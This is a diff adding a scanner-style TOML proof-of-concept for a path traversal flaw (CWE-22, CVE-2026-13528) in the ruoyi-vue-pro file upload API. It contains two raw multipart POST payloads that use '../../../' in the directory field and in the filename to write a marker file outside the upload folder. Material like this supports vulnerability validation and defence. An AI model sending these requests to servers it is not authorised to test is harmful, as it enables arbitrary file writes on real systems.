@@ -1,0 +1,35 @@
+[info]
+id = "POC-AVE-2026-0017"
+name = "ruoyi-vue-pro AppFileController 路径穿越 PoC"
+author = "AVE"
+severity = "high"
+tags = ["path-traversal", "file-upload", "CWE-22"]
+description = "ruoyi-vue-pro AppFileController 文件上传接口存在路径穿越漏洞，攻击者可通过构造 directory 或 name 参数实现任意文件写入"
+vuln_id = ["CVE-2026-13528", "AVE-2026-0017"]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/admin-api/infra/file/upload"
+headers.Content-Type = "multipart/form-data; boundary=----WebKitFormBoundary"
+body.type = "raw"
+body.content = "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"poc_validate.txt\"\r\nContent-Type: text/plain\r\n\r\nAVE-PoC-Validate-2026\r\n------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"directory\"\r\n\r\n../../../poc_test\r\n------WebKitFormBoundary--"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests]]
+method = "POST"
+path = "/admin-api/infra/file/upload"
+headers.Content-Type = "multipart/form-data; boundary=----WebKitFormBoundary"
+body.type = "raw"
+body.content = "------WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../poc_validate.txt\"\r\nContent-Type: text/plain\r\n\r\nAVE-PoC-Validate-2026\r\n------WebKitFormBoundary--"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
